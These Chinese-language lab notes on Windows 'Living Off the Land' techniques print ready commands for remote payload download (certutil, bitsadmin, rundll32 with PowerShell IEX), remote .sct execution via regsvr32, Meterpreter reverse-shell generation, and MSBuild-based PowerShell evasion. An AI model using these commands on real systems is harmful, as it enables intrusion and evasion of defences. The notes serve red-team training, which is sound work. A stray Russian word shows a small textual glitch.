#### 概述：“利用本地资源”是什么？ (Overview: What is "Living Off the Land"?)

在红队社区中，**“利用本地资源” (Living Off the Land - LOL)** 是一个广为人知的术语。这个名称来源于现实生活中“就地取材”的生存方式，即通过食用土地上可获得的食物来维持生存。类似地，在网络安全领域，攻击者和恶意软件创建者会利用目标计算机上**内置的、合法的工具和实用程序**来执行其恶意活动，而不是引入自定义的、容易被检测到的恶意软件。

该术语“利用本地资源”于 2013 年在 DerbyCon3 会议上被正式提出，自那时起，在红队社区中获得了越来越多的关注，并已成为一种经常使用且非常流行的攻击技术和策略。

这些内置工具（也称为 LOLBins - Living Off the Land Binaries, LOLScripts, 或 LOLibs）在目标系统或网络功能范围内执行各种常规的管理、诊断或配置活动。然而，它们的功能可以被攻击者滥用，例如使用 Windows 内置的 `CertUtil.exe` 工具下载恶意文件到目标机器，或使用 `PowerShell.exe` 执行无文件攻击。

**核心思路**: 攻击者倾向于使用经过微软数字签名、操作系统原生自带或可从微软官方下载的程序、脚本和库，以便：

- **融入环境 (Blend In)**: 使其恶意活动看起来像是正常的系统管理操作或用户行为。
- **规避防御控制 (Evade Defenses)**: 由于这些工具是合法的、受信任的，传统的基于签名的防病毒软件 (AV) 或应用程序白名单 (Application Whitelisting) 解决方案可能不会阻止它们的执行，或对其活动给予较低的怀疑级别。

红队操作人员在目标系统上执行其任务和活动时，首要目标之一是不被检测到，因此使用这些 LOL 技术可以更好地保持其**隐蔽性 (Stealth)**。

“利用本地资源”技术可以应用于攻击生命周期的多个阶段，包括但不限于：

- **侦察 (Reconnaissance)**
- **文件操作 (File Operations)** (下载、上传、复制、删除)
- **任意代码执行 (Arbitrary Code Execution)**
- **横向移动 (Lateral Movement)**
- **持久化 (Persistence)**
- **安全产品绕过 (Security Product Bypass)** (如 UAC 绕过、AV/EDR 规避)

---

#### 系统内部工具 (System Internals Tools - Windows Sysinternals)

##### 1. Windows Sysinternals 是什么？ (What is Windows Sysinternals?)

**Windows Sysinternals** 是一套由 Mark Russinovich 和 Bryce Cogswell 开发（后被微软收购）的免费、高级系统实用程序和技术资源集合。这些工具旨在帮助 IT 专业人员、开发人员和安全研究人员管理、故障排除、诊断和监控 Windows 操作系统的各个方面，涵盖了许多高级主题。

Sysinternals 套件中的工具可以大致分为多个类别，包括：

- **磁盘管理 (Disk Management)**: 如 `DiskMon`, `DiskView`
- **进程管理 (Process Management)**: 如 `Process Explorer`, `Process Monitor`, `PsList`
- **网络工具 (Networking Tools)**: 如 `TCPView`, `PsPing`
- **系统信息 (System Information)**: 如 `SystemInfo`, `WinObj`
- **安全工具 (Security Tools)**: 如 `AccessChk`, `Autoruns`, `Sysmon`

为了使用 Windows Sysinternals 工具，用户通常需要首次运行时接受微软的许可协议。这可以通过在命令行中传递 `-accepteula` 参数来自动完成，或者在工具首次执行时通过图形用户界面 (GUI) 进行确认。

以下是一些广受欢迎且功能强大的 Windows Sysinternals 工具：

- **AccessChk**: 帮助系统管理员检查指定用户或组对文件、目录、注册表键、全局对象和 Windows 服务的访问权限。
- **PsExec**: 一个轻量级的 telnet 替代品，允许用户在远程系统上执行程序，并可以重定向输入输出，常被用于系统管理和（不幸地）横向移动。
- **ADExplorer (Active Directory Explorer)**: 一个高级的 Active Directory (AD) 查看器和编辑器，帮助用户轻松导航 AD 数据库、查看对象属性、权限和拍摄 AD 快照。
- **ProcDump**: 监控正在运行的进程是否存在 CPU 峰值，并能够在满足特定条件时创建该进程的内存转储 (Memory Dump) 以供后续分析（例如，调试崩溃或分析恶意软件）。
- **ProcMon (Process Monitor)**: 实时监控文件系统、注册表、进程/线程活动以及网络连接的必备工具，功能非常强大。
- **TCPView**: 列出系统上所有活动的 TCP 和 UDP 端点（连接和监听端口），显示每个连接关联的进程。
- **PsTools**: 一系列命令行工具（如 `PsExec`, `PsList`, `PsKill`, `PsInfo` 等），最早设计用于协助列出和管理本地及远程系统的详细信息。
- **Portmon**: （较旧的工具，功能已被 ProcMon 部分取代）监控并显示系统上所有串行和并行端口的活动。
- **Whois**: 查询指定域名或 IP 地址的注册信息。

##### 2. Sysinternals Live

Windows Sysinternals 工具的一大特色是它们通常是**绿色软件**，无需安装即可运行。微软还提供了一项名为 **Sysinternals Live** 的服务，允许用户通过多种方式直接访问和执行这些工具，而无需预先下载整个套件。

访问和使用 Sysinternals Live 的方式包括：

- **Web 浏览器**: 直接通过 `https://live.sysinternals.com/` 网站浏览并下载单个工具。
- **Windows 共享 (SMB)**: 将 Sysinternals Live 路径 `\\live.sysinternals.com\tools\` 输入到 Windows 资源管理器或命令行中，可以直接访问和运行工具目录中的可执行文件。
- **命令提示符/PowerShell**: 可以直接从该网络路径执行命令，例如 `\\live.sysinternals.com\tools\procmon.exe`。

##### 3. 红队利用和好处 (Red Team Utilization and Benefits)

内置的系统工具和广受信任的 Sysinternals 工具对系统管理员来说非常有价值。然而，正是由于这些工具在操作系统内部具有**内在的信任度**（它们通常是微软签名或广泛认可的），它们也被黑客、恶意软件作者和渗透测试人员所滥用。

这种信任对红队操作人员尤其有益，因为他们的目标之一就是在目标系统上不被任何安全控制机制（如 AV, EDR）检测或捕获。因此，这些工具被用来：

- **规避检测 (Evade Detection)**: 某些 EDR 可能对已知 Sysinternals 工具的行为有特定的监控，但其基本执行可能被允许。
- **执行恶意操作**: 利用这些工具的合法功能实现恶意目的（例如，使用 `PsExec` 进行横向移动，使用 `ProcDump` 转储 LSASS 进程内存）。

由于现在越来越多的攻击者和恶意软件开发者使用这些 LOL 技术，蓝队（防御方）也已经意识到这些工具的恶意用途，并针对其中大部分已知滥用手法实施了相应的防御控制和检测规则。

---

#### LOLBAS 项目 (The LOLBAS Project)

##### 1. 什么是 LOLBAS？ (What is LOLBAS?)

**LOLBAS (Living Off the Land Binaries, Scripts, and Libraries)** 项目是一个社区驱动的倡议和在线仓库，其主要目标是收集、记录和归档那些可以被用于“就地取材”技术的**微软签名和操作系统内置的**二进制文件、脚本和库。

LOLBAS 项目的网站 (`https://lolbas-project.github.io/`) 提供了一个由社区贡献和维护的列表，详细说明了每个已知的 LOLBin/Script/Lib 如何被滥用于执行超出其预期设计范围的恶意或可疑操作。它允许安全研究人员、红队成员和蓝队成员根据二进制文件名、特定功能、脚本类型以及 MITRE ATT&CK 框架的对应关系进行搜索。

- **搜索功能**:
    - **二进制文件名**: 直接输入文件名 (如 `certutil.exe`)。
    - **特定功能**: 在功能名称前加 `/` (例如，`/execute` 查找所有具有执行功能的条目)。
    - **类型**: 在类型名称前加 `#` (例如，`#binary`, `#script`, `#library`)。
- **包含的类型**:
    - **脚本 (Scripts)**: 如 `.ps1`, `.vbs`, `.js` 等。
    - **二进制文件 (Binaries)**: 如 `.exe`, `.com` 等。
    - **库 (Libraries)**: 如 `.dll` 文件。
    - **其他系统二进制文件 (Other System Binaries)**

##### 2. 工具标准 (Criteria for LOLBAS Inclusion)

一个工具或文件要被认为是“就地取材”技术并被 LOLBAS 项目接受，通常需要满足以下特定标准：

1. 必须是**微软签名的文件**，或者是操作系统**原生自带**的文件，或者是可以从**微软官方直接下载**的文件。
2. 必须具有**额外的、有趣的、非预期的功能**，这些功能未包含在其已知的、文档化的正常用例中。
3. 这些非预期功能必须**有利于高级持续性威胁 (APT) 组织或红队演练**中的某些攻击阶段（如执行、持久化、防御规避等）。

##### 3. LOLBAS 项目关注的有趣特性 (Interesting Capabilities Tracked by LOLBAS)

LOLBAS 项目接受那些符合以下一种或多种功能的工具或技术提交：

- **任意代码执行 (Arbitrary Code Execution)**
- **文件操作 (File Operations)**: 包括下载 (Download)、上传 (Upload)、复制 (Copy) 文件。
- **编译代码 (Compile Code)**: 例如，使用 `csc.exe` (C# 编译器) 或 `MSBuild.exe`。
- **持久化 (Persistence)**: 包括在备用数据流 (Alternate Data Streams - ADS) 中隐藏数据，或在系统登录时执行。
- **UAC 绕过 (UAC Bypass)**
- **转储进程内存 (Dump Process Memory)**: 例如，转储 LSASS 进程内存以获取凭据。
- **DLL 注入 (DLL Injection)**

---

#### 文件操作：利用原生工具进行数据交互 (File Operations: Using Native Tools for Data Interaction)

##### 1. Certutil (`certutil.exe`)

- **合法用途**: `certutil.exe` 是 Windows 内置的命令行工具，用于管理证书颁发机构 (CA) 的配置信息、证书、证书吊销列表 (CRL) 等。其正常用途是获取和显示证书服务相关的信息。
- **恶意滥用**:
    - **文件传输 (下载)**: `certutil.exe` 可以被用来从远程 Web 服务器下载文件到目标机器。这种技术被 MITRE ATT&CK 框架识别为 **T1105 - Ingress Tool Transfer**。 **下载命令示例**:
        
        DOS
        
        ```
        certutil.exe -urlcache -split -f http://<Attacker_IP>/payload.exe C:\Windows\Temp\payload.exe
        ```
        
        - `-urlcache`: 用于显示或删除 URL 缓存条目，但在这里与其他参数组合使用时，可以触发下载。
        - `-split -f`: (通常 `-f` 是 force overwrite) `-split` 参数与 `-urlcache` 结合使用，可以强制从提供的 URL 获取文件并存储到本地。
    - **文件编码/解码**: `certutil.exe` 还可以用于对文件内容进行 Base64 编码和解码。这可以被用来混淆恶意文件或数据，使其难以被静态分析或基于签名的检测发现。此技术与 **MITRE ATT&CK T1027 - Obfuscated Files or Information** 相关。 **编码命令示例**:
        
        DOS
        
        ```
        C:\Users\thm> certutil.exe -encode payload.exe Encoded-payload.txt
        ```
        
        (解码则使用 `-decode` 参数)

##### 2. BITSAdmin (`bitsadmin.exe`)

- **合法用途**: `bitsadmin.exe` 是一个用于创建、下载或上传**后台智能传输服务 (Background Intelligent Transfer Service - BITS)** 作业并监控其进度的命令行实用程序。BITS 是一种使用空闲网络带宽以异步方式从 HTTP Web 服务器和 SMB 文件服务器传输文件的 Windows 组件。
- **恶意滥用**: 攻击者可能会滥用 BITS 作业在受感染的机器上下载并执行恶意载荷，或者用于数据渗出。这种技术也常被归类于 **T1105 - Ingress Tool Transfer**。 **下载命令示例**:
    
    DOS
    
    ```
    C:\Users\thm> bitsadmin.exe /transfer MyDownloadJob /download /priority FOREGROUND http://<Attacker_IP>/payload.exe C:\Users\thm\Desktop\payload.exe
    ```
    
    - `/transfer <JobName>`: 创建一个名为 `MyDownloadJob` 的新传输作业（或附加到现有作业）。
    - `/download`: 指定作业类型为下载。
    - `/priority FOREGROUND`: 设置作业的优先级为前台（还有 `HIGH`, `NORMAL`, `LOW`）。
    - `<URL>`: 要下载的文件的远程地址。
    - `<LocalPath>`: 文件在本地保存的路径。

##### 3. FindStr (`findstr.exe`)

- **合法用途**: `findstr.exe` 是微软自带的命令行工具，用于在文件中搜索文本字符串和模式（支持正则表达式）。它对用户和系统管理员在文件中查找内容或解析命令输出非常有用。例如，检查特定端口是否开放：`netstat -an | findstr "445"`。
- **恶意滥用 (非预期功能)**: 有研究发现 `findstr.exe` 可以被用来从网络中的 SMB 共享文件夹下载远程文件。这是一种不常见的、非预期的文件传输方法。 **下载命令示例**:
    
    DOS
    
    ```
    C:\Users\thm> findstr /V /M "dummystringthatshouldnotexist" \\<MachineName_Or_IP>\ShareFolder\remote_file.exe > C:\Windows\Temp\local_copy.exe
    ```
    
    - `/V`: 打印不包含匹配项的行。
    - `/M`: 如果文件包含匹配项，则只打印文件名。（这里可能是利用其读取远程文件的能力，结合 `/V` 和一个不存在的字符串，使其尝试读取整个文件内容，然后通过重定向 `>` 保存）。
    - `"dummystringthatshouldnotexist"`: 一个在目标文件中几乎不可能存在的搜索字符串。
    - `\\<MachineName_Or_IP>\ShareFolder\remote_file.exe`: 远程 SMB 路径下的文件。
    - `> C:\Windows\Temp\local_copy.exe`: 将 `findstr` 的输出（理论上是文件的内容，因为没有行包含那个“虚拟”字符串，但 `/V` 和 `/M` 的组合行为可能比较特殊，更常见的 SMB 文件复制是使用 `copy` 或 `robocopy`）重定向到本地文件。
    - **注意**: 原文使用 `findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe`。这种方法依赖于 `findstr` 能够访问并读取远程 SMB 文件。如果 `/V` 配合一个不存在的字符串，它理论上会输出所有行。然而，直接用 `findstr` 下载二进制文件可能不是最可靠的方式，且可能损坏文件，但它确实是一个已知的、被提及的 LOL 技术，用于规避某些只监控常见下载工具（如 `bitsadmin`, `certutil`）的检测。

---

#### 文件执行：利用原生工具进行代理执行 (File Execution: Using Native Tools for Proxy Execution)

通常情况下，执行二进制文件涉及直接从命令行 (`cmd.exe`, `powershell.exe`) 调用或双击桌面图标等已知方法。然而，通过滥用其他合法的系统二进制文件作为“代理”来间接执行有效载荷，可以达到隐藏真实执行源、混淆父子进程关系或利用受信任进程的权限等目的。根据 MITRE ATT&CK 框架，这种技术通常被称为 **T1218 - Signed Binary Proxy Execution** 或 **间接命令执行 (Indirect Command Execution)**。这种技术也有助于规避某些基于父进程或命令行参数的防御控制。

##### 1. 文件资源管理器 (`explorer.exe`)

- **合法用途**: `explorer.exe` 是 Windows 的文件管理器和 Shell 用户界面组件。
- **恶意滥用**: `explorer.exe` 可以被用来间接执行其他 `.exe` 文件。这种技术可以使恶意可执行文件似乎是从一个受信任的父进程 (`explorer.exe`) 中启动的。
    - **路径**:
        - 64位 Windows: `C:\Windows\explorer.exe`
        - 32位 Windows (或 64位 Windows 上的 32位版本，但主要指前者): `C:\Windows\SysWOW64\explorer.exe` (注意：SysWOW64 下的是32位版本，用于在64位系统上运行32位程序。System32 下的才是对应系统位数的版本。因此，在64位系统上，`C:\Windows\explorer.exe` 是64位的，`C:\Windows\SysWOW64\explorer.exe` 是32位的。笔记原文此处表述可能需 уточнение).
    - **执行命令示例**:
        
        DOS
        
        ```
        C:\Users\thm> explorer.exe /root,"C:\Windows\System32\calc.exe"
        ```
        
        这个命令会尝试以 `explorer.exe` 作为父进程来启动 `calc.exe`。`/root,` 参数通常用于指定 `explorer.exe` 打开特定文件夹视图的根，但当后面跟的是可执行文件路径时，可能触发执行。

##### 2. WMIC (`wmic.exe`)

- **合法用途**: Windows Management Instrumentation Command-line (WMIC) 是一个用于与 Windows Management Instrumentation (WMI) 进行交互的命令行工具，允许管理员查询系统信息、管理 Windows 组件等。
- **恶意滥用**: `wmic.exe` 的 `process call create` 方法可以被用来创建新进程，从而执行二进制文件。这可以作为一种规避某些基于直接命令行执行检测的防御措施的方法。此技术属于 **MITRE ATT&CK T1218 - Signed Binary Proxy Execution**。
    - **执行命令示例**:
        
        DOS
        
        ```
        C:\Users\thm> wmic.exe process call create "calc.exe"
        # 输出:
        # Executing (Win32_Process)->Create()
        # Method execution successful.
        # Out Parameters:
        # instance of __PARAMETERS
        # {
        #         ProcessId = 1740; // 新创建的 calc.exe 进程的 PID
        #         ReturnValue = 0;  // 返回值为 0 表示成功
        # };
        ```
        

##### 3. Rundll32 (`rundll32.exe`)

- **合法用途**: `rundll32.exe` 是微软内置的工具，用于加载和运行 32 位或 64 位动态链接库 (DLL) 文件中的特定导出函数。
- **恶意滥用**: 红队操作人员可以利用 `rundll32.exe` 来运行任意的恶意 DLL、执行 JavaScript 或 PowerShell 脚本，甚至执行其他命令。此技术被 MITRE ATT&CK 框架识别为 **T1218.011 - Signed Binary Proxy Execution: Rundll32**。
    - **路径**:
        - 64位 Windows: `C:\Windows\System32\rundll32.exe` (这是64位版本的 `rundll32.exe`)
        - 64位 Windows 上的 32位版本: `C:\Windows\SysWOW64\rundll32.exe` (这是32位版本的 `rundll32.exe`, 用于加载32位DLL)
    - **执行 `.exe` (通过 JavaScript)**:
        
        DOS
        
        ```
        C:\Users\thm> rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc.exe\");window.close()");
        ```
        
        这个命令利用 `mshtml.dll` 的 `RunHTMLApplication` 功能来执行嵌入的 JavaScript 代码，该 JScript 代码通过 `WScript.Shell` ActiveX 对象来运行 `calc.exe`。
    - **下载并执行 PowerShell 脚本 (通过 JavaScript)**:
        
        DOS
        
        ```
        C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<AttackBox_IP>/script.ps1');");
        ```
        
        这个命令同样使用 `rundll32.exe` 和 JScript 来执行 PowerShell 命令，该 PowerShell 命令会从指定的 URL 下载 (`DownloadString`) 并执行 (`IEX - Invoke-Expression`) 一个 PowerShell 脚本。下载的内容直接在内存中执行。

---

#### 应用程序白名单绕过 (Application Whitelisting Bypass)

应用程序白名单是一种安全策略，它只允许预先批准的、已知安全的应用程序或可执行文件在操作系统上运行，从而阻止恶意和未经授权的程序。然而，一些受信任的、微软签名的系统工具由于其特殊功能，可能被滥用于绕过这种白名单机制。

##### 1. Regsvr32 (`regsvr32.exe`)

- **合法用途**: `regsvr32.exe` 是微软的命令行工具，用于在 Windows 注册表中注册和注销 COM 组件，主要是 DLL 文件和 ActiveX 控件 (`.ocx`)。
    
- **路径**:
    
    - 64位 Windows: `C:\Windows\System32\regsvr32.exe` (64位版本，用于注册64位DLL)
    - 64位 Windows 上的 32位版本: `C:\Windows\SysWOW64\regsvr32.exe` (32位版本，用于注册32位DLL)
    - 32位 Windows: `C:\Windows\System32\regsvr32.exe` (32位版本)
- **恶意滥用**: 除了其预期用途外，`regsvr32.exe` 可以被用来执行存储在本地或远程（通过 COM 脚本宿主文件 `.sct`）的任意代码，并可能绕过 Windows 应用程序白名单。根据 Red Canary 的报告，滥用 `regsvr32.exe` 是非常流行的 ATT&CK 技术之一 (**T1218.010 - Signed Binary Proxy Execution: Regsvr32**)。它利用了受信任的 Windows 组件，并且代码可以在内存中执行，这是其能够绕过某些应用白名单配置的原因之一。
    
- **示例：执行恶意 DLL (Meterpreter)**
    
    1. **创建恶意 DLL**: 使用 `msfvenom` 创建一个 Meterpreter 反向 TCP Shell 的 DLL。
        
        - **32位 DLL 示例**:
            
            Bash
            
            ```
            user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<AttackBox_IP> LPORT=443 -f dll -a x86 -o live0fftheland_x86.dll
            ```
            
        - **64位 DLL 示例**:
            
            Bash
            
            ```
            user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<AttackBox_IP> LPORT=443 -f dll -a x64 -o live0fftheland_x64.dll
            ```
            
    2. **设置 Metasploit 监听器**:
        
        Bash
        
        ```
        msf6 > use exploit/multi/handler
        msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp # 或 windows/x64/meterpreter/reverse_tcp
        msf6 exploit(multi/handler) > set LHOST <AttackBox_IP>
        msf6 exploit(multi/handler) > set LPORT 443
        msf6 exploit(multi/handler) > exploit
        ```
        
    3. **传输 DLL**: 将生成的 DLL 文件传输到受害者机器（例如，通过 Web 服务器下载）。
        
    4. **在受害者机器上执行**:
        
        - **执行本地 32位 DLL (在64位系统上)**:
            
            DOS
            
            ```
            C:\Users\thm> C:\Windows\SysWOW64\regsvr32.exe C:\Users\thm\Downloads\live0fftheland_x86.dll
            ```
            
        - **执行本地 64位 DLL (在64位系统上)**:
            
            DOS
            
            ```
            C:\Users\thm> C:\Windows\System32\regsvr32.exe C:\Users\thm\Downloads\live0fftheland_x64.dll
            ```
            
        - **通过远程 COM 脚本宿主文件 (`.sct`) 执行 (更隐蔽)**: 攻击者可以创建一个 `.sct` 文件（XML格式），其中包含执行恶意代码的逻辑（例如，下载并运行 Shellcode，或执行 JScript/VBScript）。然后使用 `regsvr32.exe` 指向这个远程 `.sct` 文件。
            
            DOS
            
            ```
            C:\Users\thm> regsvr32.exe /s /n /u /i:http://<Attacker_IP>/malicious_script.sct Scrobj.dll
            ```
            
            - `/s`: 静默模式运行，不显示消息框。
            - `/n`: 不调用 `DllRegisterServer` 或 `DllUnregisterServer`。
            - `/u`: 指定执行 DLL 的 `DllUnregisterServer` 函数（如果 `/i` 和 DLL 同时提供，则 `/i` 优先）。
            - `/i:<url>`: 将 `<url>` (这里是 `.sct` 文件的 URL) 作为参数传递给 DLL 的 `DllInstall` 函数（如果DLL实现了它）。当与 `Scrobj.dll` (COM 脚本宿主库) 结合使用时，`Scrobj.dll` 会下载并执行 `.sct` 文件中的脚本。
            - `Scrobj.dll`: 是实际处理 `.sct` 文件的 COM 服务器。 (原文中 `regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll` 的语法将本地 DLL 作为 `Scrobj.dll` 的替代品，这不符合标准的远程 SCT 执行模式。标准的远程SCT执行通常只需要 `/i:URL` 和 `Scrobj.dll`。)
        
        执行成功后，攻击机上应收到 Meterpreter会话。
        

##### 2. Bourne Again Shell (Bash - WSL)

- **背景**: 从 Windows 10 开始，微软引入了 **Windows Subsystem for Linux (WSL)**，允许用户在 Windows 上直接运行原生的 Linux 二进制文件环境。WSL 存在 WSL1 和 WSL2 两个版本，WSL2 使用轻量级 Hyper-V 虚拟机运行完整的 Linux 内核。`bash.exe` 是微软提供的用于与 WSL 环境交互的命令行工具。
- **恶意滥用**: 由于 `bash.exe` 是一个微软签名的二进制文件，它可能被用来执行其他未签名的 Linux 可执行文件或脚本，从而可能绕过某些仅针对 Windows 可执行文件的应用程序白名单策略。ATT&CK 将这种技术归类为 **T1202.003 - Indirect Command Execution: Bash** (T1202已弃用，应查找 T1218 下的类似子技术或 T1059.004 Unix Shell)。
    - **执行命令示例**:
        
        DOS
        
        ```
        bash.exe -c "<linux_command_or_path_to_linux_payload>"
        ```
        
        例如，如果 WSL 中已安装了某个 Linux 发行版，并且其中存在恶意 ELF 文件，可以通过 `bash.exe` 来执行它。
- **前提条件**: 要在 Windows 10/11 中使用 `bash.exe`，用户需要手动启用“适用于 Linux 的 Windows 子系统”功能并安装一个 Linux 发行版。由于嵌套虚拟化限制，在某些虚拟机环境中可能无法启用 WSL。

---

#### 其他“就地取材”技术 (Other "Living Off the Land" Techniques)

##### 1. 快捷方式修改 (Shortcut Modification - LNK Files)

- **快捷方式 (.lnk 文件)** 或符号链接是用于引用操作系统内其他文件或应用程序的技术。用户点击快捷方式文件时，操作系统会执行其引用的目标文件或应用程序。
- **恶意滥用**: 攻击者可以创建或修改现有的快捷方式文件，将其目标指向恶意程序或脚本。这可以被用于：
    - **初始访问 (Initial Access)**: 例如，通过钓鱼邮件发送恶意的 LNK 文件。
    - **权限提升 (Privilege Escalation)**: 如果能修改高权限用户桌面或启动项中的快捷方式。
    - **持久化 (Persistence)**: 将恶意 LNK 文件放置在启动文件夹、任务栏固定项等位置。 MITRE ATT&CK 框架将这种技术识别为 **T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification**。
- **修改目标示例**: 快捷方式的目标字段可以被设置为执行：
    - `Rundll32.exe` (调用 DLL 中的函数或执行 JScript/VBScript)
    - `Powershell.exe` (执行 PowerShell 命令或脚本)
    - `Regsvr32.exe` (执行恶意 DLL 或 SCT 文件)
    - 直接指向磁盘上的可执行文件。 例如，攻击者可以修改一个指向 Excel 的快捷方式，使其目标字段变为 `C:\Windows\System32\rundll32.exe malicious.dll,ExportedFunction` 或者 `C:\Windows\System32\cmd.exe /c C:\path\to\malware.exe`。当受害者点击看似正常的 Excel 快捷方式图标时，实际上会执行攻击者指定的恶意代码。

##### 2. “无 PowerShell”执行：利用 MSBuild (No PowerShell Execution: Leveraging MSBuild via PowerLessShell)

- **背景**: 鉴于 PowerShell 在恶意活动中的广泛使用（如 Red Canary 2019 年的威胁检测报告指出），许多组织开始加强对 `powershell.exe` 进程执行的监控或直接阻止。因此，攻击者找到了其他方法来在目标机器上运行 PowerShell 代码逻辑，而无需显式启动 `powershell.exe` 进程。
- **PowerLessShell 工具**:
    - PowerLessShell 是一个基于 Python 的工具，它能够将 PowerShell 脚本或命令转换为一种可以在目标机器上通过其他方式执行的格式，从而避免直接运行 `powershell.exe`。
    - 它依赖于滥用 **Microsoft Build Engine (`MSBuild.exe`)**。MSBuild 是一个用于构建 Windows 应用程序的平台，它可以处理包含内联任务 (Inline Tasks) 的 XML 项目文件 (`.csproj`, `.vbproj` 等)。这些内联任务可以用 C# 等 .NET 语言编写，并在 MSBuild 执行项目文件时被编译和运行。攻击者可以将 PowerShell 代码逻辑封装在 C# 内联任务中，然后通过 `MSBuild.exe` 来执行这个项目文件。
- **攻击流程**:
    1. **下载 PowerLessShell**:
        
        Bash
        
        ```
        user@machine$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
        ```
        
    2. **生成 PowerShell 载荷 (例如，Meterpreter)**:
        
        Bash
        
        ```
        user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=<AttackBox_IP> LPORT=4443 -f psh-reflection > liv0ff.ps1
        ```
        
        (`psh-reflection` 格式生成 PowerShell 反射式注入代码)
    3. **设置 Metasploit 监听器**:
        
        Bash
        
        ```
        user@machine$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost <AttackBox_IP>; set lport 4443; exploit"
        ```
        
    4. **使用 PowerLessShell 转换 PowerShell 载荷**: 切换到 PowerLessShell 项目目录，运行工具将 `.ps1` 文件转换为与 MSBuild 兼容的 `.csproj` 文件。
        
        Bash
        
        ```
        user@machine$ python2 PowerLessShell.py -type powershell -source /path/to/liv0ff.ps1 -output liv0ff.csproj
        ```
        
    5. **传输 `.csproj` 文件**: 将生成的 `liv0ff.csproj` 文件传输到目标 Windows 机器。
    6. **在目标机器上执行 (使用 MSBuild.exe)**:
        
        DOS
        
        ```
        C:\Users\thm> C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\thm\Desktop\liv0ff.csproj
        ```
        
        (MSBuild.exe 的路径可能因 .NET Framework 版本而异，`v4.0.30319` 是一个常见的路径)
- **结果**: 当 `MSBuild.exe` 执行 `.csproj` 文件时，其中嵌入的 PowerShell 逻辑（通过 C# 内联任务）会被执行，从而可能建立反向 Shell 或执行其他恶意操作。在这个过程中，任务管理器中通常不会出现 `powershell.exe` 进程，从而可能绕过基于该进程名的简单检测。